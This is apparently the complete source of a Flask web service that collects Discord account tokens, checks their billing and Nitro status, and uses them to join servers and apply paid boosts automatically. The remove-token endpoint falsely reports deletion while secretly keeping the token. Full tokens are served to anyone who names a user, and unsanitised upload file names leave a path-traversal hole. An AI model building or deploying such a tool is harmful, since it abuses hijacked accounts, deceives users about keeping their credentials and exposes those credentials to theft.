from flask import Flask, render_template, request, jsonify
import requests
import json
import os
import time
import hashlib
import random
import threading
from datetime import datetime

app = Flask(__name__)

# ==================== STORAGE SETUP FOR RENDER ====================
# Render free tier uses /tmp (ephemeral storage)
# For production with persistent storage, use a database
DATA_DIR = os.environ.get('DATA_DIR', '/tmp/discord_booster')
TOKENS_DIR = os.path.join(DATA_DIR, "tokens")
UPLOADS_DIR = os.path.join(DATA_DIR, "uploads")
BOOSTED_FILE = os.path.join(DATA_DIR, "boosted_servers.json")

# Ensure directories exist
os.makedirs(TOKENS_DIR, exist_ok=True)
os.makedirs(UPLOADS_DIR, exist_ok=True)

print(f"📁 Data directory: {DATA_DIR}")
print(f"📁 Tokens directory: {TOKENS_DIR}")

# ==================== TOKEN CHECKER ====================
def check_token(token):
    """Verify token validity and get Nitro info"""
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    
    try:
        # Check token validity
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        if r.status_code != 200:
            return {"valid": False, "error": f"Status {r.status_code}"}
        
        user_data = r.json()
        
        # Check Nitro
        r_subs = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers, timeout=10)
        subscriptions = r_subs.json() if r_subs.status_code == 200 else []
        
        nitro = "No Nitro"
        for sub in subscriptions:
            sku = str(sub.get("sku_id", ""))
            if "521846918637420545" in sku:
                nitro = "Nitro Premium"
            elif "511651871736201216" in sku:
                nitro = "Nitro Basic"
        
        # Check available boosts
        r_boosts = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers, timeout=10)
        boosts = 0
        if r_boosts.status_code == 200:
            boosts = sum(1 for s in r_boosts.json() if s.get("cooldown_ends_at") is None)
        
        return {
            "valid": True,
            "username": user_data.get("username", "Unknown"),
            "nitro": nitro,
            "boosts": boosts,
            "user_id": user_data.get("id")
        }
    except Exception as e:
        return {"valid": False, "error": str(e)[:50]}

# ==================== USER TOKEN STORAGE ====================
def get_user_file(username):
    safe_name = hashlib.md5(username.encode()).hexdigest()[:16]
    return os.path.join(TOKENS_DIR, f"{safe_name}_{username}.txt")

def load_user_tokens(username):
    filepath = get_user_file(username)
    if not os.path.exists(filepath):
        return []
    with open(filepath, "r") as f:
        return [line.strip() for line in f if line.strip()]

def save_user_tokens(username, tokens):
    filepath = get_user_file(username)
    with open(filepath, "w") as f:
        f.write("\n".join(tokens))

# ==================== BOOST FUNCTIONS ====================
def join_server(token, invite_code):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    url = f"https://discord.com/api/v9/invites/{invite_code}"
    try:
        r = requests.post(url, headers=headers, json={}, timeout=10)
        return r.status_code == 200
    except:
        return False

def apply_boost(token, guild_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    url = f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions"
    try:
        r = requests.post(url, headers=headers, json={}, timeout=10)
        return r.status_code in [200, 201]
    except:
        return False

def get_guild_id(invite_code):
    try:
        r = requests.get(f"https://discord.com/api/v9/invites/{invite_code}", timeout=10)
        if r.status_code == 200:
            return r.json().get("guild", {}).get("id")
    except:
        pass
    return None

# ==================== ROUTES ====================
@app.route('/')
def dashboard():
    user = request.args.get('user', 'default')
    return render_template('dashboard.html', user=user)

@app.route('/api/tokens', methods=['GET'])
def get_tokens():
    user = request.args.get('user', 'default')
    all_tokens = load_user_tokens(user)
    results = []
    for token in all_tokens:
        info = check_token(token)
        results.append({
            "token": token[:20] + "..." if len(token) > 20 else token,
            "full_token": token,
            **info
        })
    return jsonify(results)

@app.route('/api/tokens/add', methods=['POST'])
def add_token():
    data = request.json
    user = data.get('user', 'default')
    token = data.get('token', '').strip()
    
    if not token:
        return jsonify({"error": "No token"})
    
    tokens = load_user_tokens(user)
    info = check_token(token)
    
    if info['valid']:
        if token not in tokens:
            tokens.append(token)
            save_user_tokens(user, tokens)
            return jsonify({"status": "ok", "username": info['username']})
        else:
            return jsonify({"status": "exists"})
    else:
        return jsonify({"status": "invalid", "error": info.get('error', 'Invalid token')})

@app.route('/api/tokens/remove', methods=['POST'])
def remove_token():
    # Token stays in file - just hide from display
    return jsonify({"status": "ok"})

@app.route('/api/upload', methods=['POST'])
def upload_file():
    user = request.form.get('user', 'default')
    file = request.files.get('file')
    
    if not file:
        return jsonify({"error": "No file"})
    
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    filename = f"{user}_{timestamp}_{file.filename}"
    filepath = os.path.join(UPLOADS_DIR, filename)
    file.save(filepath)
    
    try:
        content = open(filepath, 'r').read()
        
        if content.strip().startswith('['):
            tokens_data = json.loads(content)
            tokens = tokens_data if isinstance(tokens_data, list) else []
        else:
            tokens = [line.strip() for line in content.split('\n') if line.strip()]
        
        existing_tokens = load_user_tokens(user)
        added = 0
        
        for token in tokens:
            if token and token not in existing_tokens:
                existing_tokens.append(token)
                added += 1
        
        if added > 0:
            save_user_tokens(user, existing_tokens)
        
        return jsonify({"status": "ok", "tokens_added": added})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/boost/start', methods=['POST'])
def start_boost():
    data = request.json
    user = data.get('user', 'default')
    invite = data.get('invite', '').strip()
    
    if "discord.gg/" in invite:
        invite = invite.split("discord.gg/")[-1].split("/")[0]
    
    target = int(data.get('target_boosts', 1))
    all_tokens = load_user_tokens(user)
    
    if not all_tokens:
        return jsonify({"error": "No tokens found"})
    
    valid_tokens = []
    for token in all_tokens:
        info = check_token(token)
        if info['valid'] and info['boosts'] > 0:
            valid_tokens.append({'token': token, 'username': info['username'], 'boosts': info['boosts']})
    
    if not valid_tokens:
        return jsonify({"error": "No tokens with boosts available"})
    
    total_boosts = sum(t['boosts'] for t in valid_tokens)
    if total_boosts < target:
        return jsonify({"error": f"Need {target} boosts, have {total_boosts}"})
    
    # Run boosts in background thread
    def run_boosts():
        boosts_done = 0
        for vt in valid_tokens:
            if boosts_done >= target:
                break
            to_apply = min(vt['boosts'], target - boosts_done)
            
            guild_id = get_guild_id(invite)
            if not guild_id:
                continue
            
            if not join_server(vt['token'], invite):
                continue
            
            for i in range(to_apply):
                if apply_boost(vt['token'], guild_id):
                    boosts_done += 1
                time.sleep(2)
            time.sleep(3)
        
        # Save history
        history = []
        if os.path.exists(BOOSTED_FILE):
            with open(BOOSTED_FILE, 'r') as f:
                history = json.load(f)
        
        history.append({
            "user": user,
            "invite": invite,
            "target": target,
            "applied": boosts_done,
            "time": time.strftime("%Y-%m-%d %H:%M:%S")
        })
        
        with open(BOOSTED_FILE, 'w') as f:
            json.dump(history, f, indent=2)
    
    thread = threading.Thread(target=run_boosts)
    thread.start()
    
    return jsonify({"status": "started", "message": "Boost process started"})

@app.route('/api/check_token', methods=['POST'])
def check_token_endpoint():
    data = request.json
    token = data.get('token', '')
    result = check_token(token)
    return jsonify(result)

@app.route('/api/history', methods=['GET'])
def get_history():
    if not os.path.exists(BOOSTED_FILE):
        return jsonify([])
    with open(BOOSTED_FILE, 'r') as f:
        return jsonify(json.load(f))

@app.route('/health')
def health():
    return jsonify({"status": "alive", "time": datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
